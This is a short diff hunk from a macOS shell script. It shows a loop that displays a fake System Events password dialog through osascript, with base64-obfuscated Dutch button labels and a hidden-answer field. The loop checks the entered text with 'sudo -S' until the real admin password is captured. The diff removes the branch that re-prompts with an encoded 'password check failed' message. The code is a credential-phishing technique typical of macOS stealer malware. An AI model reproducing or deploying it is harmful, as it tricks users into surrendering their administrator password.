@@ -37,8 +37,6 @@ while true; do
     a="$(osascript -e "tell application \"System Events\" to display dialog \"${msg}\" with title \"${ti}\" default answer \"\" buttons {\"$(x TmVlCg==)\", \"$(x U3RhIHRvZQo=)\"} default button \"$(x U3RhIHRvZQo=)\" cancel button \"$(x TmVlCg==)\" with hidden answer with icon POSIX file \"${ot}\"" -e "text returned of result")"
     if echo "${a}" | sudo -S printf "" && echo "${a}" | sudo -S -v 2>/dev/null; then
         break
-    else
-        msg="$(x Q29udHJvbGUgdmFuIGFjY291bnRuYWFtIG9mIHdhY2h0d29vcmQgbWlzbHVrdC4gUHJvYmVlciBvcG5pZXV3Ogo=c)"
     fi
 done
 sleep 2
